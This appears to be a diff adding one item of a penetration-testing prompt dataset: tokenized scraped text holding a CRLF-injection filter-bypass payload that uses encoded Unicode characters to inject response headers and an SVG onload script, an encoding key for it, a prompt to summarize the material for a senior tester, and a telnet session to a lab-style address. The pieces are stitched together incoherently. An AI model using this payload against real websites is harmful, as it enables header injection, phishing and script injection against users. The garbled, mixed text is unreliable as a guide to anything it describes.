@@ -1,0 +1,8 @@
+Given Context: : 34 < html > you have been phished < / html > crlf - filter bypass using utf - 8 encoding % e5 % 98 % 8a % e5 % 98 % 8dcontent - type : text / html % e5 % 98 % 8a % e5 % 98 % 8dlocation : % e5 % 98 % 8a % e5 % 98 % 8d % e5 % 98 % 8a % e5 % 98 % 8d % e5 % 98 % bcsvg / onload = alert % 28innerhtml % 28 % 29 % e5 % 98 % be remainder : % e5 % 98 % 8a = % 0a = \ u560a % e5 % 98 % 8d = % 0d = \ u560d % e5 % 98 % be = % 3e = \ u563e ( > ) % e5 % 98 % bc = % 3c = \ u563c ( < ) labs url references url url [SEP]
+
+ Answer The input content is from a security testing tool. You need to list down all the points that are interesting to you; you should summarize it as if you are reporting to a senior penetration tester for further guidance.\n
+telnet 10.10.11.239 3000
+Trying 10.10.11.239...
+Connected to 10.10.11.239.
+Escape character is '^]'.
+please summarize in 50 words or less
